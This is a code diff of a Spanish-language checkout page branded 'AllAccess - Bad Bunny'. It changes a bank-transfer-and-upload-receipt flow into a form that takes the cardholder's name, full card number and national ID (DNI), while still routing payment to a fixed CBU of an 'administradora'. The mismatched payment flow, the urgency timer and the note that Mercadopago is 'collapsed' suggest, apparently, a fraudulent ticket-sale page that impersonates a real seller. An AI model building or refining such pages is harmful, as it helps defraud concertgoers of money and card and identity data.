@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AllAccess - Bad Bunny - Pago</title>
+    <title>AllAccess - Bad Bunny - Pago con Tarjeta</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -160,54 +160,78 @@
             margin-bottom: 30px;
         }
 
-        .payment-option {
-            background: #f9f9f9;
-            border: 2px solid #eee;
-            border-radius: 12px;
-            padding: 20px;
+        .info-box {
+            background: #f0fdf4;
+            border: 1px solid #86efac;
+            border-radius: 8px;
+            padding: 15px;
             margin-bottom: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
+            font-size: 13px;
+            color: #666;
+            line-height: 1.6;
         }
 
-        .payment-option:hover {
-            border-color: #7c00e2;
-            background: #f9f7ff;
-        }
-
-        .payment-option.active {
-            border-color: #7c00e2;
-            background: #f9f7ff;
-        }
-
-        .payment-option-header {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-
-        .payment-icon {
-            font-size: 30px;
-        }
-
-        .payment-title {
-            font-weight: 700;
-            font-size: 16px;
+        .info-box strong {
             color: #000;
         }
 
-        .payment-details {
-            background: white;
-            border: 1px dashed #7c00e2;
-            border-radius: 8px;
-            padding: 20px;
-            margin-top: 15px;
-            display: none;
+        .info-box.warning {
+            background: #fffbf0;
+            border-color: #ffe4c4;
         }
 
-        .payment-details.show {
+        .info-box.warning strong {
+            color: #ff6b6b;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .form-section h3 {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #000;
+            text-transform: uppercase;
+            border-bottom: 2px solid #7c00e2;
+            padding-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
             display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #7c00e2;
+            box-shadow: 0 0 0 3px rgba(124, 0, 226, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
         }
 
         .cbu-section {
@@ -251,82 +275,34 @@
             background: #6a00cc;
         }
 
-        .info-box {
-            background: #fffbf0;
-            border: 1px solid #ffe4c4;
+        .installment-info {
+            background: #f9f7ff;
+            border: 1px solid #e0d4ff;
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 15px;
-            font-size: 13px;
+        }
+
+        .installment-info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e0d4ff;
+        }
+
+        .installment-info-row:last-child {
+            border-bottom: none;
+        }
+
+        .installment-info-label {
             color: #666;
-            line-height: 1.6;
+            font-size: 13px;
         }
 
-        .info-box.success {
-            background: #f0fdf4;
-            border-color: #86efac;
-        }
-
-        .info-box strong {
-            color: #000;
-        }
-
-        .upload-section {
-            margin-top: 30px;
-        }
-
-        .upload-section h4 {
-            font-size: 14px;
+        .installment-info-value {
             font-weight: 700;
-            margin-bottom: 15px;
-            color: #000;
-        }
-
-        .file-upload {
-            border: 2px dashed #d0deff;
-            border-radius: 8px;
-            padding: 30px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: #f9f7ff;
-        }
-
-        .file-upload:hover {
-            border-color: #7c00e2;
-            background: #f0e6ff;
-        }
-
-        .file-upload.has-file {
-            border-color: #86efac;
-            background: #f0fdf4;
-        }
-
-        .upload-icon {
-            font-size: 40px;
-            margin-bottom: 10px;
-        }
-
-        .upload-text {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-        }
-
-        .upload-hint {
-            font-size: 12px;
-            color: #999;
-        }
-
-        .file-name {
-            margin-top: 10px;
-            font-size: 13px;
             color: #7c00e2;
-            font-weight: 600;
-        }
-
-        #fileInput {
-            display: none;
+            font-size: 13px;
         }
 
         .divider {
@@ -353,6 +329,8 @@
             display: flex;
             align-items: center;
             gap: 20px;
+            width: 100%;
+            justify-content: space-between;
         }
 
         .total-info {
@@ -372,6 +350,26 @@
             color: #000;
         }
 
+        .btn-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-back {
+            background: #ddd;
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-back:hover {
+            background: #ccc;
+        }
+
         .btn-finalize {
             background: #7c00e2;
             color: white;
@@ -383,13 +381,8 @@
             font-size: 14px;
         }
 
-        .btn-finalize:hover:not(:disabled) {
+        .btn-finalize:hover {
             background: #6a00cc;
-        }
-
-        .btn-finalize:disabled {
-            background: #ccc;
-            cursor: not-allowed;
         }
 
         @media (max-width: 768px) {
@@ -407,10 +400,15 @@
             }
 
             .total-content {
+                flex-direction: column;
+            }
+
+            .btn-container {
                 width: 100%;
                 flex-direction: column;
             }
 
+            .btn-back,
             .btn-finalize {
                 width: 100%;
             }
@@ -442,49 +440,75 @@
 
     <div class="content-wrapper">
         <div class="main-container">
-            <h1 class="page-title">Abona tu compra</h1>
+            <h1 class="page-title">Pago con Tarjeta de Crédito/Débito</h1>
 
             <div class="payment-container">
-                <div class="payment-option active" id="virtualWalletOption" onclick="selectPaymentMethod(this, 'wallet')">
-                    <div class="payment-option-header">
-                        <div class="payment-title">Billetera Virtual</div>
-                    </div>
+                <div class="info-box">
+                    <strong>✓ Información de tu pago:</strong><br>
+                    Se cobrará al CBU de la administradora de forma segura.
+                </div>
 
-                    <div class="payment-details show" id="walletDetails">
-                        <div class="cbu-section">
-                            <span class="cbu-label">CBU para administradora:</span>
-                            <div class="cbu-value">
-                                0000184305010025590764
-                                <button class="copy-btn" onclick="copyCBU()">Copiar</button>
-                            </div>
+                <!-- RESUMEN DE CUOTAS -->
+                <div class="form-section">
+                    <h3>📋 Resumen de tu compra</h3>
+                    <div class="installment-info" id="installmentInfo">
+                        <div class="installment-info-row">
+                            <span class="installment-info-label">Banco:</span>
+                            <span class="installment-info-value" id="bankDisplay">-</span>
                         </div>
-
-                        <div class="info-box">
-                            <strong>Transferencia disponible por:</strong><br>
-                            ✓ Billeteras virtuales (Ualá, Brubank, Banco del Bicentenario, etc.)<br>
-                            ✓ Cualquier cuenta bancaria
-                            <br><br>
-                            <strong style="color: #ff6b6b;">✕ Mercadopago NO disponible (actualmente colapsado)</strong>
+                        <div class="installment-info-row">
+                            <span class="installment-info-label">Cuotas:</span>
+                            <span class="installment-info-value" id="installmentsDisplay">-</span>
                         </div>
-
-                        <div class="divider"></div>
-
-                        <div class="info-box success">
-                            <strong>✓ Después de hacer la transferencia:</strong><br>
-                            Sube el comprobante de pago en el apartado inferior y presiona "Finalizar". En menos de 30 segundos recibirás tu QR, detalles de entrada y confirmación por correo electrónico.
+                        <div class="installment-info-row">
+                            <span class="installment-info-label">Valor por cuota:</span>
+                            <span class="installment-info-value" id="installmentAmountDisplay">-</span>
                         </div>
-
-                        <div class="upload-section">
-                            <h4>Seleccionar comprobante</h4>
-                            <div class="file-upload" id="fileUploadArea" onclick="document.getElementById('fileInput').click()">
-                                <div class="upload-icon">📎</div>
-                                <div class="upload-text">Haz clic para seleccionar archivo</div>
-                                <div class="upload-hint">o arrastra tu comprobante aquí</div>
-                                <div class="file-name" id="fileName"></div>
-                            </div>
-                            <input type="file" id="fileInput" accept="image/*,.pdf" onchange="handleFileSelect(event)">
+                        <div class="installment-info-row" style="border-top: 1px solid #e0d4ff; margin-top: 8px; padding-top: 12px;">
+                            <span class="installment-info-label" style="font-weight: 700;">Total a pagar:</span>
+                            <span class="installment-info-value" style="font-size: 15px;" id="totalDisplay">-</span>
                         </div>
                     </div>
+                </div>
+
+                <!-- CBU ADMINISTRADORA -->
+                <div class="form-section">
+                    <h3>🏦 CBU para abono</h3>
+                    <div class="cbu-section">
+                        <span class="cbu-label">CBU de la administradora:</span>
+                        <div class="cbu-value">
+                            0000184305010025590764
+                            <button class="copy-btn" onclick="copyCBU()">Copiar</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DATOS DE TARJETA -->
+                <div class="form-section">
+                    <h3>💳 Datos de tu tarjeta</h3>
+                    
+                    <div class="form-group">
+                        <label for="cardholderName">Nombre del titular *</label>
+                        <input type="text" id="cardholderName" placeholder="Ej: Juan Pérez" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cardNumber">Número de tarjeta *</label>
+                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+
+
+                    <div class="form-group">
+                        <label for="documentNumber">DNI/Documento *</label>
+                        <input type="text" id="documentNumber" placeholder="Ej: 12345678" required>
+                    </div>
+                </div>
+
+                <div class="divider"></div>
+
+                <div class="info-box warning">
+                    <strong>⚠️ Importante:</strong><br>
+                    El pago se procesará hacia el CBU de la administradora. Asegúrate de que todos los datos sean correctos antes de continuar.
                 </div>
             </div>
         </div>
@@ -496,7 +520,10 @@
                 <span class="total-label">Total a pagar:</span>
                 <span class="total-amount" id="totalAmount">$ 425.500,00</span>
             </div>
-            <button class="btn-finalize" id="finalizeBtn" onclick="finalizePayment()" disabled>Finalizar</button>
+            <div class="btn-container">
+                <button class="btn-back" onclick="goBack()">Volver</button>
+                <button class="btn-finalize" onclick="finalizePay()">Procesar Pago</button>
+            </div>
         </div>
     </div>
 
@@ -522,48 +549,36 @@
             item.addEventListener('click', closeMenu);
         });
 
-        let selectedFile = null;
-
         // Obtener datos de la sesión
         let selectedQuantity = parseInt(sessionStorage.getItem('selectedQuantity')) || 1;
         let basePrice = parseFloat(sessionStorage.getItem('basePrice')) || 350000;
+        let selectedBank = sessionStorage.getItem('selectedBank') || '-';
+        let selectedInstallments = parseInt(sessionStorage.getItem('selectedInstallments')) || 1;
 
         // Inicializar página
         document.addEventListener('DOMContentLoaded', function() {
-            updateTotal();
+            displayInstallmentInfo();
             startTimer();
         });
 
-        function selectPaymentMethod(element, method) {
-            document.querySelectorAll('.payment-option').forEach(el => {
-                el.classList.remove('active');
-                el.querySelectorAll('.payment-details').forEach(detail => {
-                    detail.classList.remove('show');
-                });
-            });
-
-            element.classList.add('active');
-            const details = element.querySelector('.payment-details');
-            if (details) {
-                details.classList.add('show');
-            }
-
-            // Limpiar selecciones de banco y cuotas cuando cambias de método
-            if (method === 'card') {
-                selectedBank = null;
-                selectedInstallments = null;
-                document.querySelectorAll('.bank-btn, .installment-btn').forEach(btn => {
-                    btn.classList.remove('selected');
-                });
-                document.getElementById('installmentSummary').classList.remove('show');
-            }
-        }
-
-        function updateTotal() {
+        function displayInstallmentInfo() {
             const subtotal = basePrice * selectedQuantity;
             const serviceFee = 55500;
             const total = subtotal + serviceFee;
+            const installmentAmount = total / selectedInstallments;
 
+            const bankNames = {
+                'dni': 'DNI',
+                'bnaplus': 'BNA+',
+                'bbva': 'BBVA',
+                'galicia': 'Galicia',
+                'santander': 'Santander'
+            };
+
+            document.getElementById('bankDisplay').textContent = bankNames[selectedBank] || '-';
+            document.getElementById('installmentsDisplay').textContent = selectedInstallments + ' cuota' + (selectedInstallments > 1 ? 's' : '');
+            document.getElementById('installmentAmountDisplay').textContent = '$ ' + installmentAmount.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('totalDisplay').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
             document.getElementById('totalAmount').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
         }
 
@@ -603,50 +618,43 @@
             });
         }
 
-        function handleFileSelect(event) {
-            const file = event.target.files[0];
-            if (file) {
-                selectedFile = file;
-                document.getElementById('fileName').textContent = '✓ ' + file.name;
-                document.getElementById('fileUploadArea').classList.add('has-file');
-                document.getElementById('finalizeBtn').disabled = false;
-            }
+        // Formatear número de tarjeta
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = formattedValue;
+        });
+
+        function goBack() {
+            window.history.back();
         }
 
-        // Drag and drop
-        const fileUploadArea = document.getElementById('fileUploadArea');
-        
-        fileUploadArea.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            fileUploadArea.style.borderColor = '#7c00e2';
-            fileUploadArea.style.background = '#f0e6ff';
-        });
+        function finalizePay() {
+            // Validar campos
+            const cardholderName = document.getElementById('cardholderName').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const documentNumber = document.getElementById('documentNumber').value.trim();
 
-        fileUploadArea.addEventListener('dragleave', () => {
-            fileUploadArea.style.borderColor = '#d0deff';
-            fileUploadArea.style.background = '#f9f7ff';
-        });
-
-        fileUploadArea.addEventListener('drop', (e) => {
-            e.preventDefault();
-            const files = e.dataTransfer.files;
-            if (files.length > 0) {
-                document.getElementById('fileInput').files = files;
-                handleFileSelect({target: {files: files}});
-            }
-        });
-
-        function finalizePayment() {
-            if (!selectedFile) {
-                alert('Por favor sube un comprobante de pago');
+            if (!cardholderName) {
+                alert('Por favor ingresa el nombre del titular');
                 return;
             }
 
-            alert('Procesando pago...\nComprobante: ' + selectedFile.name + '\n\nEn menos de 30 segundos recibirás tu QR y detalles de entrada.');
+            if (cardNumber.length !== 16) {
+                alert('El número de tarjeta debe tener 16 dígitos');
+                return;
+            }
+
+            if (!documentNumber) {
+                alert('Por favor ingresa tu DNI/Documento');
+                return;
+            }
+
+            alert('Procesando pago...\n\nTarjeta: **** **** **** ' + cardNumber.slice(-4) + '\nCuotas: ' + selectedInstallments + '\n\nEn menos de 30 segundos recibirás tu QR y detalles de entrada.');
             
             // Aquí iría la lógica de procesamiento del pago
             // setTimeout(() => {
-            //     window.location.href = 'success.html';
+            //     window.location.href = 'confirmation.html';
             // }, 2000);
         }
     </script>
